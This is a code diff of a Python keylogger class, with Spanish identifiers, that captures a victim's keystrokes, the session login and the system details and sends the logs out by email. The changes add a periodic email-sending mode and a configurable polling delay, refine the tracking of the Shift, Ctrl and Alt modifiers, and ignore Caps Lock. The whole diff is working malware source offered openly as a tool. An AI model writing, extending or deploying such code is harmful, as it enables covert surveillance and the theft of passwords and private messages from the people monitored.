@@ -27,6 +27,7 @@ class KeyLogger:
         self.__segundos_inactivo = self.__leerJson.get_valor("segundos_inactivo")
         self.__tiempo_reenviar_correo = self.__leerJson.get_valor("tiempo_reenviar_correo")
         self.__cantidad_maxima_caracteres = self.__leerJson.get_valor("caracteres_maximos")
+        self.__tiempo_periodico = self.__leerJson.get_valor("enviar_periodicamente")
         self.__nombre_sesion = getlogin()
         self.__sistema = f"{system()} {release()}"
         self.__ruta_log = self.__leerJson.get_valor("ruta_log")
@@ -45,9 +46,12 @@ class KeyLogger:
         self.__enviar_alas_minuto = 0
         self.__enviar_alas_segundo = 0
         self.__estado_hora_programada = False
+        self.__enviar_inactividad = False
+        self.__enviar_periodicamente = False
         self.__horas_restantes = 0
         self.__minutos_restantes = 0
         self.__segundos_restantes = 0
+        self.__delay = 1
         self.__corriendo = None
         self.__listener = None
         self.__shift_presionado = False
@@ -133,15 +137,33 @@ class KeyLogger:
         self.__corriendo = True
 
         # Modo Hora Programada
-        if self.__horas_inactivo == 0 and self.__minutos_inactivo == 0 and self.__segundos_inactivo == 0:
+        if self.__horas_inactivo == 0 and self.__minutos_inactivo == 0 and self.__segundos_inactivo == 0 and self.__tiempo_periodico == 0:
+
             self.__estado_hora_programada = True
+            self.__enviar_periodicamente = False
+            self.__enviar_inactividad = False
             self.__calcular_horas_restantes()
-            print(f"[+] Enviar en Hora Programada [Activada]")
+            print(f"[+] Enviar en Hora Programada [Activado]")
             print(f"[+] Se Enviara a las: {self.__enviar_hora_programada[0]}h:{self.__enviar_hora_programada[1]}m:{self.__enviar_hora_programada[2]}s")
             print(f"[+] Faltan {self.__horas_restantes}h:{self.__minutos_restantes}m:{self.__segundos_restantes}s")
 
+        # Modo Periodicamente
+        elif (self.__horas_inactivo == 0 and self.__minutos_inactivo == 0 and self.__segundos_inactivo == 0 and
+            self.__enviar_hora_programada[0] == 0 and self.__enviar_hora_programada[1] == 0 and self.__enviar_hora_programada[2] == 0):
+            
+            self.__estado_hora_programada = False
+            self.__enviar_periodicamente = True
+            self.__enviar_inactividad = False
+            self.__delay = self.__tiempo_periodico * 60
+            print("[+] Enviar Periodicamente [Activado]")
+            print(f"[+] Se Enviara Cada {self.__tiempo_periodico}m")
+
         # Modo Inactividad
         else:
+            self.__estado_hora_programada = False
+            self.__enviar_periodicamente = False
+            self.__enviar_inactividad = True
+            print("[+] Enviar por Inactividad [Activado]")
             print(f"[+] Se Enviara Cada: {self.__horas_inactivo}h:{self.__minutos_inactivo}m:{self.__segundos_inactivo}s")
 
         # Modo Caracteres Maximos
@@ -244,7 +266,6 @@ class KeyLogger:
 
         # Correr Mientras este Activo
         while(self.__corriendo):
-            sleep(1)
             self.__verificar_hora_envio()
 
     # Inicar KL en Segundo PLano
@@ -290,6 +311,9 @@ class KeyLogger:
     # Verificar si ya es Hora de Enviar Correo
     def __verificar_hora_envio(self):
 
+        # Delay de Comprobacion
+        sleep(self.__delay)
+
         # Obtener Hora Actual
         self.__hora_actual = int(datetime.today().strftime("%H"))
         self.__minuto_actual = int(datetime.today().strftime("%M"))
@@ -299,11 +323,16 @@ class KeyLogger:
         if (self.__hora_actual == self.__enviar_alas_hora and
             self.__minuto_actual == self.__enviar_alas_minuto and
             self.__segundo_actual == self.__enviar_alas_segundo and
-            not self.__estado_hora_programada):
+            self.__enviar_inactividad):
                 print("[!] Se Enviara Correo por Inactividad")
                 self.__enviar_correo(mensaje_enviado="[+] Correo por Inactividad Enviado")
                 self.__enviar_alas_segundo = 0
                 self.__enviar_alas_minuto = 0
+
+        # Modo: Enviar Periodicamente
+        elif (self.__enviar_periodicamente):
+            print("[!] Se Enviara Correo Periodico")
+            self.__enviar_correo(mensaje_enviado=f"[+] Correo Periodico Enviado, se Enviara de Nuevo en {self.__tiempo_periodico}m")
         
         # Modo: Enviar en Hora programada
         elif self.__estado_hora_programada:
@@ -315,9 +344,9 @@ class KeyLogger:
 
         # Modo: Caracteres Maximos (Solo Numeros Positivos)
         if self.__cantidad_maxima_caracteres > 0:
-
             if self.__caracteres_log >= self.__cantidad_maxima_caracteres:
-                self.__enviar_correo(mensaje_enviado="[+] Limite De Caracteres Alcanzado, Correo Enviado")
+                print("[!] Se Enviara Correo por Limite de Caracteres")
+                self.__enviar_correo(mensaje_enviado="[+] Correo Enviado por Limite Enviado")
 
     # Enviar Correo
     def __enviar_correo(self, mensaje_enviado: str):
@@ -395,19 +424,19 @@ class KeyLogger:
         self.key_str = str(key).replace("'","") # Eliminar Comillas
 
         # Verificar si Mantiene SHIFT
-        if self.key_str in ["Key.shift","Key.shift_r"] and not self.__shift_presionado:
+        if self.key_str in ["Key.shift_l","Key.shift_r", "Key.shift"] and not self.__shift_presionado:
             self.__shift_presionado = True
             print("Shift Presionado")
             return
 
         # Verificar si Mantiene CONTROL
-        if self.key_str in ["Key.ctrl_l", "Key.ctrl_r"] and not self.__control_presionado:
+        if self.key_str in ["Key.ctrl_l", "Key.ctrl_r", "Key.ctrl"] and not self.__control_presionado:
             self.__control_presionado = True
             print("Control Presionado")
             return
 
         # Verificar si Mantiene ALT
-        if self.key_str in ["Key.alt_l", "Key.alt_gr"] and not self.__alt_presionado:
+        if self.key_str in ["Key.alt_l", "Key.alt_r", "Key.alt_gr"] and not self.__alt_presionado:
             self.__alt_presionado = True
             print("Alt Presionado")
             return
@@ -463,6 +492,10 @@ class KeyLogger:
             self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=" <--1> ")
             return
 
+        # Verificar CAPS LOCK
+        if self.key_str == "Key.caps_lock":
+            return
+
         # Agregar Teclas Presionadas a Lista Combinacion si Alt esta Presionado
         if self.__alt_presionado:
             self.__lista_combinacion.append(self.key_str)
@@ -472,7 +505,7 @@ class KeyLogger:
 
             # Verificar si NO Esta Presionado Alt y esta en Diccionario Especial, Ignorar
             if not(self.key_str in self.__diccionario_especial and self.__alt_presionado):
-                print(self.__diccionario_especial.get(self.key_str))
+                print(f"Diccionario Especial: {self.__diccionario_especial.get(self.key_str)}")
                 self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.__diccionario_especial.get(self.key_str))
 
         # Verificar si esta en Diccionario de Combinaciones Control
@@ -480,7 +513,7 @@ class KeyLogger:
     
             # Omitir Combinaciones (Control + C) o (Control + X)
             if not (self.key_str == "\\x03" or self.key_str == "\\x18"):
-                print(self.__diccionario_combinaciones.get(self.key_str))
+                print(f"Diccionario Combinacion Control: {self.__diccionario_combinaciones.get(self.key_str)}")
                 self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.__diccionario_combinaciones.get(self.key_str))
         
         # Cualquier Otra Tecla
@@ -514,7 +547,7 @@ class KeyLogger:
 
             # Simbolo o Combinacion no Identificada
             else:
-                print(self.key_str)
+                print(f"Simbolo o No Identificado: {self.key_str}")
                 self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str)
 
         # Verificar que NO Este Hora Programada Activada
@@ -540,17 +573,17 @@ class KeyLogger:
         self.key_str = str(key).replace("'","")
 
         # Verificar si Suelta SHIFT
-        if self.key_str in ["Key.shift", "Key.shift_r"]:
+        if self.key_str in ["Key.shift_l", "Key.shift_r", "Key.shift"]:
             self.__shift_presionado = False
             print("Shift Soltado")
 
         # Verificar si Suelta CONTROL
-        if self.key_str in ["Key.ctrl_l", "Key.ctrl_r"]:
+        if self.key_str in ["Key.ctrl_l", "Key.ctrl_r", "Key.ctrl"]:
             self.__control_presionado = False
             print("Control Soltado")
 
         # Verificar si Suelta ALT
-        if self.key_str in ["Key.alt_l", "Key.alt_gr"]:
+        if self.key_str in ["Key.alt_l", "Key.alt_r", "Key.alt_gr"]:
             self.__alt_presionado = False
             print("Alt Soltado")
 
